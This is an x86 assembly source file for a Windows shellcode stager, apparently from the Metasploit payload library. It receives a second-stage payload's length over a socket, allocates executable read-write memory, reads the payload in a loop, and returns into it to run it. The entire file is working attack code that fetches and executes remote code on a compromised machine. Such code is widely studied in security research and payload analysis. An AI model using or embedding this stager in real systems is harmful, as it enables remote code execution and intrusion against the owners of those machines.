;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
;-----------------------------------------------------------------------------;
[BITS 32]

; Compatible: block_bind_tcp, block_reverse_tcp, block_reverse_ipv6_tcp

; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
; Output: None.
; Clobbers: EAX, EBX, ESI, (ESP will also be modified)

recv:
  ; Receive the size of the incoming second stage...
  push byte 0            ; flags
  push byte 4            ; length = sizeof( DWORD );
  push esi               ; the 4 byte buffer on the stack to hold the second stage length
  push edi               ; the saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, &dwLength, 4, 0 );
  ; Alloc a RWX buffer for the second stage
  mov esi, [esi]         ; dereference the pointer to the second stage length
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push esi               ; push the newly recieved second stage length.
  push byte 0            ; NULL as we dont care where the allocation is.
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  ; Receive the second stage and execute it...
  xchg ebx, eax          ; ebx = our new memory address for the new stage
  push ebx               ; push the address of the new stage so we can return into it
read_more:               ;
  push byte 0            ; flags
  push esi               ; length
  push ebx               ; the current address into our second stage's RWX buffer
  push edi               ; the saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, buffer, length, 0 );
  add ebx, eax           ; buffer += bytes_received
  sub esi, eax           ; length -= bytes_received, will set flags
  jnz read_more          ; continue if we have more to read
  ret                    ; return into the second stage
